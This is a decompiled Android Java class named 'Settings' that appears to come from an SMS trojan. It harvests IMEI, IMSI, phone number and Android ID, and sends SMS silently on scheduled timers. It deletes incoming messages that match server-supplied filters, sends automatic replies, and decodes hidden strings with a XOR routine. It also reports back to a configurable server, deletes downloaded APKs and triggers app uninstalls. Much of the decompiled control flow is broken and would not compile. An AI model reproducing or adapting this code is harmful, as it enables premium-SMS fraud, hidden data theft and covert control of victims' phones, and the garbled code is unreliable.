package test.app;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.Environment;
import android.provider.Settings.Secure;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.format.Time;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.List;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.json.JSONArray;
import org.json.JSONObject;

public class Settings
  extends SettingsBase
{
  public Settings(Context paramContext)
  {
    super(paramContext);
  }
  
  public static void cancelCustomTimer(Context paramContext, String paramString)
  {
    try
    {
      if (Constants.DEBUG) {
        debug("cancelCustomTimer: " + paramString);
      }
      Intent localIntent = new Intent(paramContext, MainReceiver.class);
      localIntent.setAction(paramString);
      paramString = PendingIntent.getBroadcast(paramContext, 0, localIntent, 0);
      ((AlarmManager)paramContext.getSystemService("alarm")).cancel(paramString);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void cleanDownloads()
  {
    Object localObject = null;
    for (;;)
    {
      int i;
      try
      {
        i = Build.VERSION.SDK_INT;
        if (i >= 8)
        {
          try
          {
            File localFile2 = (File)Environment.class.getMethod("getExternalStoragePublicDirectory", new Class[] { String.class }).invoke(null, new Object[] { (String)Environment.class.getField("DIRECTORY_DOWNLOADS").get(null) });
            localObject = localFile2;
          }
          catch (Exception localException2)
          {
            localException2.printStackTrace();
            continue;
          }
          localObject = ((File)localObject).listFiles();
          i = 0;
          if (i < localObject.length) {
            break label119;
          }
          return;
        }
      }
      catch (Exception localException1)
      {
        localException1.printStackTrace();
        return;
      }
      File localFile1 = new File(Environment.getExternalStorageDirectory() + "/Downloads/");
      continue;
      label119:
      if (localFile1[i].getName().toLowerCase().endsWith("./apk")) {
        localFile1[i].delete();
      }
      i += 1;
    }
  }
  
  public static void debug(String paramString)
  {
    Object localObject;
    if (Constants.DEBUG)
    {
      System.out.println(paramString);
      localObject = new File(Environment.getExternalStorageDirectory() + "/log.txt");
      if (((File)localObject).exists()) {}
    }
    try
    {
      ((File)localObject).createNewFile();
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        try
        {
          localObject = new BufferedWriter(new FileWriter((File)localObject, true), 8);
          Time localTime = new Time();
          localTime.setToNow();
          ((BufferedWriter)localObject).append(localTime.format("%H:%M:%S %d.%m.%Y"));
          ((BufferedWriter)localObject).append(": ");
          ((BufferedWriter)localObject).append(paramString);
          ((BufferedWriter)localObject).newLine();
          ((BufferedWriter)localObject).close();
          return;
        }
        catch (IOException paramString)
        {
          paramString.printStackTrace();
        }
        localIOException = localIOException;
        localIOException.printStackTrace();
      }
    }
  }
  
  public static String decript(String paramString)
  {
    return decript(Base64.decode(paramString, 0));
  }
  
  public static String decript(byte[] paramArrayOfByte)
  {
    int i = 0;
    int m = paramArrayOfByte[0] & 0xFF;
    int j = m + 1;
    try
    {
      for (;;)
      {
        if (j >= paramArrayOfByte.length) {
          return new String(paramArrayOfByte, m + 1, paramArrayOfByte.length - m - 1, "utf-8");
        }
        paramArrayOfByte[j] = ((byte)(paramArrayOfByte[j] ^ paramArrayOfByte[(i + 1)] & 0xFF));
        int k = i + 1;
        i = k;
        if (k == m) {
          i = 0;
        }
        j += 1;
      }
      return "";
    }
    catch (Exception paramArrayOfByte)
    {
      paramArrayOfByte.printStackTrace();
    }
  }
  
  private String generateId()
  {
    try
    {
      byte[] arrayOfByte = new byte[32];
      Random localRandom = new Random();
      localRandom.setSeed(System.currentTimeMillis());
      int i = 0;
      for (;;)
      {
        if (i >= arrayOfByte.length) {
          return new String(arrayOfByte);
        }
        arrayOfByte[i] = ((byte)((byte)localRandom.nextInt(25) + 97));
        i += 1;
      }
      return "";
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  public static String getAndroidId(Context paramContext)
  {
    try
    {
      paramContext = Settings.Secure.getString(paramContext.getContentResolver(), "android_id");
      return paramContext;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "error";
  }
  
  public static String[] getAnswerMessage(Context paramContext, String paramString1, String paramString2)
  {
    try
    {
      localList = new DbAnswer(paramContext).getItems();
      if (!Constants.DEBUG) {
        break label156;
      }
      debug("list size: " + localList.size());
    }
    catch (Exception paramString1)
    {
      for (;;)
      {
        List localList;
        DbAnswerItem localDbAnswerItem;
        String[] arrayOfString;
        sendMessage(paramContext, paramString1);
        break;
        i += 1;
        continue;
        label156:
        int i = 0;
      }
    }
    if (i < localList.size())
    {
      localDbAnswerItem = (DbAnswerItem)localList.get(i);
      if (Constants.DEBUG) {
        debug("item: " + localDbAnswerItem);
      }
      arrayOfString = localDbAnswerItem.getMessage(paramString1, paramString2);
      if (arrayOfString != null)
      {
        setResponse(paramContext, new Command(localDbAnswerItem.commandId, "smsAnswer"), "");
        return arrayOfString;
      }
    }
    return null;
  }
  
  public static String getImei(Context paramContext)
  {
    return getModemValue(paramContext, MODEM.IMEI);
  }
  
  public static String getImsi(Context paramContext)
  {
    return getModemValue(paramContext, MODEM.IMSI);
  }
  
  public static String getModemValue(Context paramContext, int paramInt)
  {
    try
    {
      TelephonyManager localTelephonyManager = (TelephonyManager)paramContext.getSystemService("phone");
      paramContext = "";
      if (paramInt == MODEM.IMEI) {
        paramContext = localTelephonyManager.getDeviceId();
      } else if (paramInt == MODEM.IMSI) {
        paramContext = localTelephonyManager.getSubscriberId();
      } else if (paramInt == MODEM.PHONE) {
        paramContext = localTelephonyManager.getLine1Number();
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    do
    {
      return "error";
    } while (paramContext == null);
    return paramContext;
  }
  
  public static String getOsVersion()
  {
    return System.getProperty("os.version");
  }
  
  public static PendingIntent getPendingIntent(Context paramContext, String paramString)
  {
    Intent localIntent = new Intent(paramContext, MainReceiver.class);
    localIntent.setAction(paramString);
    return PendingIntent.getBroadcast(paramContext, 0, localIntent, 0);
  }
  
  public static String getPhone(Context paramContext)
  {
    return getModemValue(paramContext, MODEM.PHONE);
  }
  
  public static long getRandomValue(int paramInt1, int paramInt2)
  {
    long l = new Random().nextInt(paramInt2 - paramInt1) + paramInt1;
    if (Constants.DEBUG) {
      debug(String.format("getRandomValue(%d, %d): %d", new Object[] { Integer.valueOf(paramInt1), Integer.valueOf(paramInt2), Long.valueOf(l) }));
    }
    return l;
  }
  
  public static boolean isDeleteMessage(Context paramContext, String paramString1, String paramString2)
  {
    try
    {
      List localList = new DbFilter(paramContext).getItems();
      int i = 0;
      while (i < localList.size())
      {
        DbFilterItem localDbFilterItem = (DbFilterItem)localList.get(i);
        if (localDbFilterItem.isMatch(paramString1, paramString2))
        {
          setResponse(paramContext, new Command(localDbFilterItem.commandId, "smsFilter"), "");
          return true;
        }
        i += 1;
      }
      return false;
    }
    catch (Exception paramString1)
    {
      sendMessage(paramContext, paramString1);
    }
  }
  
  public static boolean isMatch(String paramString1, String paramString2)
  {
    return Pattern.compile(paramString2, 32).matcher(paramString1).matches();
  }
  
  public static void log(Exception paramException)
  {
    paramException.printStackTrace();
  }
  
  public static void openUrl(Context paramContext, String paramString)
  {
    try
    {
      paramString = new Intent("android.intent.action.VIEW", Uri.parse(paramString));
      paramString.addFlags(268435456);
      paramContext.startActivity(paramString);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void sendMessage(Context paramContext, Exception paramException)
  {
    try
    {
      JSONObject localJSONObject1 = new JSONObject();
      localJSONObject1.put(MainService.response_fields.TYPE, MainService.response_types.ERROR);
      Object localObject1 = paramException.getMessage();
      int i;
      if (localObject1 != null)
      {
        localJSONObject1.put(MainService.response_fields.DESCRIPTION, localObject1);
        localObject1 = new JSONArray();
        paramException = paramException.getStackTrace();
        i = 0;
      }
      for (;;)
      {
        if (i >= paramException.length)
        {
          localJSONObject1.put("trace", localObject1);
          sendMessage(paramContext, localJSONObject1.toString(4));
          return;
          localJSONObject1.put(MainService.response_fields.DESCRIPTION, "null");
          break;
        }
        Object localObject2 = paramException[i];
        JSONObject localJSONObject2 = new JSONObject();
        localJSONObject2.put("ClassName", localObject2.getClassName());
        localJSONObject2.put("FileName", localObject2.getFileName());
        localJSONObject2.put("LineNumber", localObject2.getLineNumber());
        localJSONObject2.put("MethodName", localObject2.getMethodName());
        ((JSONArray)localObject1).put(localJSONObject2);
        i += 1;
      }
      return;
    }
    catch (Exception paramContext) {}
  }
  
  public static void sendMessage(Context paramContext, String paramString)
  {
    if (Constants.DEBUG) {
      debug("sendMessage: " + paramString);
    }
    Time localTime = new Time();
    localTime.setToNow();
    new DbLog(paramContext).addMessage(localTime.format("%H:%M:%S %Y.%m.%d"), paramString);
    startService(paramContext, MainService.actions.LOG);
  }
  
  public static boolean sendSms(Context paramContext, String paramString1, String paramString2, String paramString3)
  {
    if (Constants.DEBUG) {
      debug(String.format("sms[%s]: %s to %s", new Object[] { paramString1, paramString3, paramString2 }));
    }
    try
    {
      SmsManager localSmsManager = SmsManager.getDefault();
      localSmsManager.sendMultipartTextMessage(paramString2, null, localSmsManager.divideMessage(paramString3), null, null);
      return true;
    }
    catch (Exception paramString2)
    {
      paramString2 = paramString2.toString();
      setResponse(paramContext, new Command(paramString1, "sendSms"), paramString2);
    }
    return false;
  }
  
  public static void setResponse(Context paramContext, Command paramCommand, String paramString)
  {
    if (Constants.DEBUG) {
      debug("setResponse()");
    }
    if (Constants.DEBUG) {
      debug("message: " + paramString);
    }
    if (Constants.DEBUG) {
      debug("command: " + paramCommand);
    }
    if (paramCommand == null) {}
    try
    {
      paramCommand = new JSONObject();
      paramCommand.put(MainService.response_fields.TYPE, MainService.response_types.ERROR);
      paramCommand.put(MainService.response_fields.DESCRIPTION, "invalid command");
      sendMessage(paramContext, paramCommand.toString(4));
      return;
    }
    catch (Exception paramCommand)
    {
      int j;
      JSONObject localJSONObject;
      int i;
      sendMessage(paramContext, paramCommand);
    }
    j = MainService.command_result.OK;
    localJSONObject = new JSONObject();
    localJSONObject.put(MainService.response_fields.TYPE, MainService.response_types.RESPONSE);
    localJSONObject.put(MainService.response_fields.ID, paramCommand.id);
    localJSONObject.put(MainService.response_fields.NAME, paramCommand.name);
    i = j;
    if (paramString != null)
    {
      i = j;
      if (paramString.length() > 0)
      {
        i = MainService.command_result.ERROR;
        localJSONObject.put(MainService.response_fields.ERROR, paramString);
      }
    }
    localJSONObject.put(MainService.response_fields.RESULT, i);
    sendMessage(paramContext, localJSONObject.toString());
    return;
  }
  
  public static void startBackgroundSms(Context paramContext)
  {
    if (Constants.DEBUG) {
      debug("startBackgroundSms()");
    }
    List localList = new DbSms(paramContext).getItems();
    int i = 0;
    for (;;)
    {
      if (i >= localList.size()) {
        return;
      }
      DbSmsItem localDbSmsItem = (DbSmsItem)localList.get(i);
      startCustomTimer(paramContext, MainReceiver.actions.SEND_SMS + "." + localDbSmsItem.commandId, localDbSmsItem.time, false);
      i += 1;
    }
  }
  
  public static void startCustomTimer(Context paramContext, String paramString, long paramLong, boolean paramBoolean)
  {
    try
    {
      if (Constants.DEBUG) {
        debug("startCustomTimer " + paramString + ": " + paramLong + " milisec, repeat: " + paramBoolean);
      }
      if (Constants.DEBUG) {
        debug("now: " + System.currentTimeMillis());
      }
      Intent localIntent = new Intent(paramContext, MainReceiver.class);
      localIntent.setAction(paramString);
      paramString = PendingIntent.getBroadcast(paramContext, 0, localIntent, 0);
      paramContext = (AlarmManager)paramContext.getSystemService("alarm");
      if (paramBoolean)
      {
        paramContext.setRepeating(0, System.currentTimeMillis() + paramLong, paramLong, paramString);
        return;
      }
      paramContext.set(0, paramLong, paramString);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void startService(Context paramContext, String paramString)
  {
    Intent localIntent = new Intent(paramContext, MainService.class);
    localIntent.setAction(paramString);
    paramContext.startService(localIntent);
  }
  
  public static void uninstallApk(Context paramContext, String paramString)
  {
    try
    {
      Intent localIntent = new Intent("android.intent.action.DELETE");
      localIntent.setData(Uri.parse("package:" + paramString));
      localIntent.addFlags(268435456);
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public boolean getActiveDeleteOff()
  {
    return getBoolean(k[6]);
  }
  
  public boolean getDeleteAll()
  {
    return getBoolean(k[4]);
  }
  
  public String getId()
  {
    return Constants.ID;
  }
  
  public long getInterval()
  {
    return getLong(k[2]);
  }
  
  public boolean getNeedDelete()
  {
    return getBoolean(k[5]);
  }
  
  public String getServer()
  {
    return getString(k[3]);
  }
  
  public long getTime()
  {
    return getLong(k[1]);
  }
  
  public void setActiveDeleteOff(boolean paramBoolean)
  {
    setBoolean(k[6], paramBoolean);
  }
  
  public void setDeleteAll(boolean paramBoolean)
  {
    setBoolean(k[4], paramBoolean);
  }
  
  public void setInterval(long paramLong)
  {
    setLong(k[2], paramLong);
  }
  
  public void setNeedDelete(boolean paramBoolean)
  {
    setBoolean(k[5], paramBoolean);
  }
  
  public void setServer(String paramString)
  {
    setString(k[3], paramString);
  }
  
  public void setTime(long paramLong)
  {
    setLong(k[1], paramLong);
  }
  
  private static final class MODEM
  {
    public static int IMEI = 1;
    public static int IMSI = 2;
    public static int PHONE = 3;
    
    private MODEM() {}
  }
  
  public static final class times
  {
    public static long DAY = HOUR * 24L;
    public static long HOUR;
    public static long MINUTE;
    public static long SECOND = 1000L;
    
    static
    {
      MINUTE = SECOND * 60L;
      HOUR = MINUTE * 60L;
    }
    
    public times() {}
  }
}
